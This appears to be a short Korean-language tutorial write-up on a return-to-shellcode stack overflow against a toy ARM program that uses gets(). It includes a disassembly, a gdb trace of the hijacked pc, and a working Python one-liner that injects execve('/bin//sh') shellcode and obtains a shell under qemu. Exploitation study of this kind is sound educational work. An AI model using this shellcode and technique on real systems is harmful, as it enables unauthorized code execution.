---
title: Return-to-shellcode - arm
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, return-to-shellcode, arm]
math: true
mermaid: true
---

## Proof of concept

```c
#include <stdio.h>
  
int main(){
        char name[128];
        printf("What's your name: ");
        gets(name);
        printf("Hello %s\n",name);
}
```

## Exploit plan

overflow를 통해 shellcode 위치를 pc에 덮어씌우면 exploit이 가능하다.

```
Dump of assembler code for function main:
...
0x0001045c <+48>:   mov r3, #0
0x00010460 <+52>:   mov r0, r3
0x00010464 <+56>:   sub sp, r11, #4
0x00010468 <+60>:   pop {r11, pc} 
```

변조된 pc

```
gdb-peda$ info r pc
pc             0xfffef5b0   0xfffef5b0
gdb-peda$ x/10i 0xfffef5b0 <= shellcode
=> 0xfffef5b0:  add r3, pc, #1
0xfffef5b4: bx  r3
0xfffef5b8: andcc   r4, lr, r8, ror r6
0xfffef5bc: bne 0x12535c8
0xfffef5c0:         ; <UNDEFINED> instruction: 0x27081a92
0xfffef5c4: strcc   r5, [r3, -r2, asr #3]
0xfffef5c8: eorvs   sp, pc, #1, 30
0xfffef5cc: svccs   0x002f6e69
0xfffef5d0: hvcmi   5763    ; 0x1683
0xfffef5d4: cmpmi   r1, r1, asr #2
```

## Exploit

```bash
$ (python -c 'print "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x0e\x30\x01\x90\x49\x1a\x92\x1a\x08\x27\xc2\x51\x03\x37\x01\xdf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"+"A"*98+"\xb0\xf5\xfe\xff"';cat) | qemu-arm -L /usr/arm-linux-gnueabi a.out 
What's your name: Hello 0Կ/ෆ0'Q7ݯbin//shAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA°
id
uid=1000(**)
pwd
/home/
```